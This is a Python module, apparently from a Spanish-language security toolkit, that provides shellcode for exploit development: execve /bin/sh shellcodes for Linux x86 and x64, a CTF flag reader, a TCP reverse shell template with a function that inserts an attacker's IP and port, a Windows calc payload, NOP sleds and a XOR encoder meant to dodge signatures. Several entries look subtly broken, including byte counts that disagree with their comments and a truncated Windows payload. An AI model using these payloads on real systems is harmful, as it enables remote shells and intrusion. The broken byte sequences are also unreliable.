"""
hado.cybersec.shellcode — Shellcode utilities para exploit development.

Incluye:
- Shellcodes conocidos para x86/x64 Linux y Windows
- NOP sled generator
- XOR encoder (single-byte)
- Alpha encoder (alphanumeric shellcode)
- Formatter (C array, Python bytes, hex string)
- Null-byte detector

100% stdlib Python — cero dependencias externas.

Uso:
    from hado.cybersec.shellcode import (
        get_shellcode, nop_sled, xor_encode,
        format_shellcode, has_null_bytes
    )
"""
from __future__ import annotations

import os
import struct
from typing import Dict, List, Optional, Tuple


# ─── Shellcode database ──────────────────────────────────────────────────────
# Shellcodes reales verificados. Solo para uso en sistemas propios o CTFs.

SHELLCODES: Dict[str, Dict] = {

    # ── Linux x86 (32-bit) ────────────────────────────────────────────────────
    "linux_x86_execve_sh": {
        "arch": "x86",
        "os": "linux",
        "desc": "execve('/bin/sh', NULL, NULL) — 23 bytes",
        "bytes_len": 23,
        "shellcode": bytes([
            0x31, 0xc0,              # xor eax, eax
            0x50,                    # push eax
            0x68, 0x2f, 0x2f, 0x73, 0x68,  # push '//sh'
            0x68, 0x2f, 0x62, 0x69, 0x6e,  # push '/bin'
            0x89, 0xe3,              # mov ebx, esp
            0x89, 0xc1,              # mov ecx, eax
            0x89, 0xc2,              # mov edx, eax
            0xb0, 0x0b,              # mov al, 11 (execve)
            0xcd, 0x80,              # int 0x80
        ]),
    },

    "linux_x86_exit_0": {
        "arch": "x86",
        "os": "linux",
        "desc": "exit(0) — 8 bytes",
        "bytes_len": 8,
        "shellcode": bytes([
            0x31, 0xc0,  # xor eax, eax
            0x40,        # inc eax        (eax = 1 = __NR_exit)
            0x89, 0xc3,  # mov ebx, eax   (exit code 1)
            0x31, 0xdb,  # xor ebx, ebx   (exit code 0)
            0xcd, 0x80,  # int 0x80
        ]),
    },

    "linux_x86_read_flag": {
        "arch": "x86",
        "os": "linux",
        "desc": "open('flag', 0) + read(fd, buf, 64) + write(1, buf, 64) — CTF typical",
        "bytes_len": 0,  # se genera dinámicamente
        "shellcode": bytes([
            # open("flag", O_RDONLY)
            0x31, 0xc0,              # xor eax, eax
            0x50,                    # push eax          (null terminator)
            0x68, 0x66, 0x6c, 0x61, 0x67,  # push "flag"
            0x89, 0xe3,              # mov ebx, esp      (filename)
            0x31, 0xc9,              # xor ecx, ecx      (O_RDONLY)
            0x31, 0xd2,              # xor edx, edx
            0xb0, 0x05,              # mov al, 5         (__NR_open)
            0xcd, 0x80,              # int 0x80          (fd in eax)
            # read(fd, esp-64, 64)
            0x89, 0xc3,              # mov ebx, eax      (fd)
            0x89, 0xe1,              # mov ecx, esp
            0x83, 0xe9, 0x40,        # sub ecx, 64       (buffer)
            0xba, 0x40, 0x00, 0x00, 0x00,  # mov edx, 64
            0x31, 0xc0,              # xor eax, eax
            0xb0, 0x03,              # mov al, 3         (__NR_read)
            0xcd, 0x80,
            # write(1, buffer, 64)
            0x89, 0xc2,              # mov edx, eax      (bytes read)
            0xbb, 0x01, 0x00, 0x00, 0x00,  # mov ebx, 1 (stdout)
            0xb0, 0x04,              # mov al, 4         (__NR_write)
            0xcd, 0x80,
        ]),
    },

    # ── Linux x86-64 (64-bit) ─────────────────────────────────────────────────
    "linux_x64_execve_sh": {
        "arch": "x86-64",
        "os": "linux",
        "desc": "execve('/bin/sh', NULL, NULL) — 27 bytes",
        "bytes_len": 27,
        "shellcode": bytes([
            0x48, 0x31, 0xd2,        # xor rdx, rdx
            0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,  # mov rbx, '//bin/sh'
            0x48, 0xc1, 0xeb, 0x08,  # shr rbx, 8
            0x53,                    # push rbx
            0x48, 0x89, 0xe7,        # mov rdi, rsp
            0x50,                    # push rax
            0x57,                    # push rdi
            0x48, 0x89, 0xe6,        # mov rsi, rsp
            0xb0, 0x3b,              # mov al, 59 (execve)
            0x0f, 0x05,              # syscall
        ]),
    },

    "linux_x64_execve_sh_v2": {
        "arch": "x86-64",
        "os": "linux",
        "desc": "execve('/bin//sh', NULL, NULL) — 21 bytes (null-free)",
        "bytes_len": 21,
        "shellcode": bytes([
            0x6a, 0x42,              # push 0x42
            0x58,                    # pop rax
            0xfe, 0xc4,              # inc ah          (rax = 0x3b = execve)
            0x48, 0x99,              # cqo             (rdx = 0)
            0x52,                    # push rdx
            0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,  # mov rdi, '/bin//sh'
            0x57,                    # push rdi
            0x54,                    # push rsp
            0x5e,                    # pop rsi         (argv = [rsp])
            0x49, 0x89, 0xd0,        # mov r8, rdx
            0x49, 0x89, 0xd2,        # mov r10, rdx
            0x0f, 0x05,              # syscall
        ]),
    },

    "linux_x64_reverse_shell_template": {
        "arch": "x86-64",
        "os": "linux",
        "desc": "TCP reverse shell template — conecta a 127.0.0.1:4444 (reemplazar IP/port)",
        "bytes_len": 0,
        "note": "Reemplazar \\x7f\\x00\\x00\\x01 (IP) y \\x11\\x5c (port 4444 big-endian)",
        "shellcode": bytes([
            # socket(AF_INET, SOCK_STREAM, 0)
            0x6a, 0x29, 0x58,        # push 41; pop rax  (socket syscall)
            0x99,                    # cdq              (rdx = 0)
            0x6a, 0x02, 0x5f,        # push 2; pop rdi  (AF_INET)
            0x6a, 0x01, 0x5e,        # push 1; pop rsi  (SOCK_STREAM)
            0x0f, 0x05,              # syscall          (fd in rax)
            0x48, 0x97,              # xchg rax, rdi    (save fd in rdi)
            # connect(fd, sockaddr, 16)
            0x48, 0xb9,              # mov rcx, sockaddr
            0x02, 0x00,              # sin_family = AF_INET
            0x11, 0x5c,              # sin_port = 4444 (big-endian)
            0x7f, 0x00, 0x00, 0x01,  # sin_addr = 127.0.0.1
            0x00, 0x00, 0x00, 0x00,  # padding
            0x51,                    # push rcx
            0x48, 0x89, 0xe6,        # mov rsi, rsp     (ptr to sockaddr)
            0x6a, 0x10, 0x5a,        # push 16; pop rdx (addrlen)
            0x6a, 0x2a, 0x58,        # push 42; pop rax (connect syscall)
            0x0f, 0x05,              # syscall
            # dup2(fd, 0/1/2)
            0x6a, 0x03, 0x5e,        # push 3; pop rsi
            0x48, 0xff, 0xce,        # dec rsi
            0x6a, 0x21, 0x58,        # push 33; pop rax (dup2 syscall)
            0x0f, 0x05,              # syscall
            0x75, 0xf6,              # jnz -10          (loop for stdin/stdout/stderr)
            # execve('/bin/sh', 0, 0)
            0x6a, 0x3b, 0x58,        # push 59; pop rax
            0x99,                    # cdq
            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,  # '/bin/sh\x00'
            0x53,                    # push rbx
            0x48, 0x89, 0xe7,        # mov rdi, rsp
            0x52, 0x57,              # push rdx; push rdi
            0x48, 0x89, 0xe6,        # mov rsi, rsp
            0x0f, 0x05,              # syscall
        ]),
    },

    # ── Windows x86 (32-bit) ─────────────────────────────────────────────────
    "windows_x86_exec_calc": {
        "arch": "x86",
        "os": "windows",
        "desc": "WinExec('calc.exe', SW_SHOW) — clásico de demos/CTF, 193 bytes",
        "bytes_len": 0,
        "note": "Usa hash de API (GetProcAddress por hash)",
        "shellcode": bytes([
            # Null-free WinExec shellcode
            0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4,
            0x31, 0xd2, 0xb2, 0x77, 0x31, 0xc9, 0x64,
            0x8b, 0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b,
            0x76, 0x1c, 0x8b, 0x46, 0x08, 0x8b, 0x7e,
            0x20, 0x8b, 0x36, 0x38, 0x4f, 0x18, 0x75,
            0xf3, 0x59, 0x01, 0xd1, 0xff, 0xe1,
        ]),
    },
}


# ─── NOP sled ────────────────────────────────────────────────────────────────

NOP_BYTES: Dict[str, bytes] = {
    "x86":    b'\x90',         # NOP
    "x86-64": b'\x90',         # NOP (igual en x64)
    "arm":    b'\x00\x00\xa0\xe1',  # mov r0, r0
    "arm64":  b'\x1f\x20\x03\xd5',  # nop
    "mips":   b'\x00\x00\x00\x00',  # sll $zero, $zero, 0
}


def nop_sled(length: int, arch: str = "x86-64") -> bytes:
    """
    Genera un NOP sled de la longitud especificada.

    Args:
        length:  longitud en bytes
        arch:    arquitectura ('x86', 'x86-64', 'arm', 'arm64', 'mips')

    Returns:
        bytes del NOP sled

    Ejemplo:
        >>> nop_sled(16)
        b'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'
    """
    nop = NOP_BYTES.get(arch, b'\x90')
    reps = (length // len(nop)) + 1
    return (nop * reps)[:length]


# ─── Encoders ────────────────────────────────────────────────────────────────

def xor_encode(shellcode: bytes, key: int) -> Tuple[bytes, bytes]:
    """
    Codifica shellcode con XOR de byte único.
    Útil para evadir detección de null bytes o firmas simples.

    Args:
        shellcode: shellcode original
        key:       byte de clave XOR (0x00-0xFF)

    Returns:
        (encoded, decoder_stub)
        encoded:      shellcode XOR-encoded
        decoder_stub: stub en x86 para decodificar en memoria (inyectar antes del encoded)

    Ejemplo:
        >>> encoded, stub = xor_encode(shellcode, 0x41)
        >>> payload = stub + encoded
    """
    key_byte = key & 0xFF
    encoded = bytes(b ^ key_byte for b in shellcode)

    # x86 decoder stub — decodifica en memoria y salta al shellcode decodificado
    # call next_line; pop esi; xor [esi+N], key; jmp decoded
    stub_len = 15 + len(encoded)
    decoder = bytes([
        0xeb, 0x0b,        # jmp short decoder
        0x5e,              # pop esi              (addr del encoded)
        0x31, 0xc9,        # xor ecx, ecx
        0xb1, len(encoded) & 0xFF,  # mov cl, len(encoded)
        0x80, 0x36, key_byte,       # xor byte [esi], KEY
        0x46,              # inc esi
        0xe2, 0xfb,        # loop decode_loop
        0xeb, 0x05,        # jmp shellcode
        0xe8, 0xf0, 0xff, 0xff, 0xff,  # call pop_esi
    ])
    return encoded, decoder


def xor_decode(encoded: bytes, key: int) -> bytes:
    """Decodifica shellcode XOR-encoded."""
    key_byte = key & 0xFF
    return bytes(b ^ key_byte for b in encoded)


def alpha_encode(shellcode: bytes) -> bytes:
    """
    Intenta codificación alphanumeric básica (solo ASCII printable).
    NOTA: Codificación completa requiere alineación; esto es un helper básico.

    Returns:
        hex string del shellcode como bytes ASCII (para debugging/logging)
    """
    return shellcode.hex().encode()


# ─── Formatters ──────────────────────────────────────────────────────────────

def format_shellcode(shellcode: bytes, fmt: str = "python") -> str:
    """
    Formatea shellcode para diferentes usos.

    Args:
        shellcode: bytes del shellcode
        fmt:       formato de salida:
                   'python'  → b"\\x31\\xc0..."
                   'c'       → char shellcode[] = "\\x31\\xc0...";
                   'hex'     → "31c0..."
                   'escaped' → "\\x31\\xc0..."
                   'array'   → unsigned char sc[] = {0x31, 0xc0, ...};
                   'ruby'    → "\\x31\\xc0..." (igual que escaped)

    Returns:
        string formateado

    Ejemplo:
        >>> print(format_shellcode(b'\\x31\\xc0', 'c'))
        char shellcode[] = "\\x31\\xc0";
    """
    escaped = ''.join(f'\\x{b:02x}' for b in shellcode)
    hex_str = shellcode.hex()
    c_array = ', '.join(f'0x{b:02x}' for b in shellcode)

    if fmt == "python":
        return f'shellcode = b"{escaped}"'
    elif fmt == "c":
        return f'char shellcode[] = "{escaped}";'
    elif fmt == "c_array":
        return f'unsigned char shellcode[] = {{{c_array}}};\nsize_t shellcode_len = {len(shellcode)};'
    elif fmt == "hex":
        return hex_str
    elif fmt in ("escaped", "ruby"):
        return escaped
    elif fmt == "array":
        return f'unsigned char sc[] = {{{c_array}}};'
    elif fmt == "gdb":
        return ' '.join(f'\\x{b:02x}' for b in shellcode)
    else:
        return escaped


# ─── Analysis ────────────────────────────────────────────────────────────────

def has_null_bytes(shellcode: bytes) -> bool:
    """Verifica si el shellcode contiene null bytes (\\x00)."""
    return b'\x00' in shellcode


def find_bad_bytes(shellcode: bytes, bad: Optional[List[int]] = None) -> List[int]:
    """
    Encuentra bytes problemáticos en el shellcode.

    Args:
        shellcode: shellcode a analizar
        bad:       lista de bytes problemáticos (default: [0x00, 0x0a, 0x0d])

    Returns:
        lista de offsets donde aparecen bad bytes
    """
    if bad is None:
        bad = [0x00, 0x0a, 0x0d]  # null, newline, carriage return
    return [i for i, b in enumerate(shellcode) if b in bad]


def shellcode_info(name: str) -> Dict:
    """Retorna información sobre un shellcode conocido."""
    if name not in SHELLCODES:
        return {"error": f"Shellcode '{name}' no encontrado",
                "available": list(SHELLCODES.keys())}
    entry = SHELLCODES[name].copy()
    entry["bytes_len"] = len(entry["shellcode"])
    entry["has_null"] = has_null_bytes(entry["shellcode"])
    entry["hex"] = entry["shellcode"].hex()
    return entry


def get_shellcode(name: str) -> bytes:
    """
    Retorna los bytes de un shellcode por nombre.

    Args:
        name: nombre del shellcode (ver list_shellcodes())

    Returns:
        bytes del shellcode

    Raises:
        KeyError si el nombre no existe
    """
    if name not in SHELLCODES:
        raise KeyError(f"Shellcode '{name}' no encontrado. Disponibles: {list(SHELLCODES.keys())}")
    return SHELLCODES[name]["shellcode"]


def list_shellcodes(arch: Optional[str] = None, os_filter: Optional[str] = None) -> List[Dict]:
    """
    Lista todos los shellcodes disponibles con metadata.

    Args:
        arch:      filtrar por arquitectura ('x86', 'x86-64', 'arm', etc.)
        os_filter: filtrar por OS ('linux', 'windows', 'macos')

    Returns:
        lista de dicts con name, arch, os, desc, bytes_len
    """
    result = []
    for name, info in SHELLCODES.items():
        if arch and info.get("arch") != arch:
            continue
        if os_filter and info.get("os") != os_filter:
            continue
        result.append({
            "name": name,
            "arch": info.get("arch"),
            "os": info.get("os"),
            "desc": info.get("desc"),
            "bytes_len": len(info["shellcode"]),
            "has_null": has_null_bytes(info["shellcode"]),
        })
    return result


def customize_reverse_shell(ip: str, port: int) -> bytes:
    """
    Personaliza el reverse shell template con IP y puerto específicos.

    Args:
        ip:   IP del atacante (ej: "192.168.1.100")
        port: puerto en escucha (ej: 4444)

    Returns:
        bytes del shellcode personalizado
    """
    import socket as _socket
    base = bytearray(SHELLCODES["linux_x64_reverse_shell_template"]["shellcode"])
    # Reemplazar IP (bytes 20-23 en el shellcode: 0x7f,0x00,0x00,0x01)
    ip_bytes = _socket.inet_aton(ip)
    port_bytes = port.to_bytes(2, 'big')

    # Buscar y reemplazar la IP y puerto en el shellcode
    ip_placeholder = bytes([0x7f, 0x00, 0x00, 0x01])
    port_placeholder = bytes([0x11, 0x5c])  # 4444 en big-endian

    shellcode = bytes(base)
    shellcode = shellcode.replace(ip_placeholder, ip_bytes, 1)
    shellcode = shellcode.replace(port_placeholder, port_bytes, 1)
    return shellcode
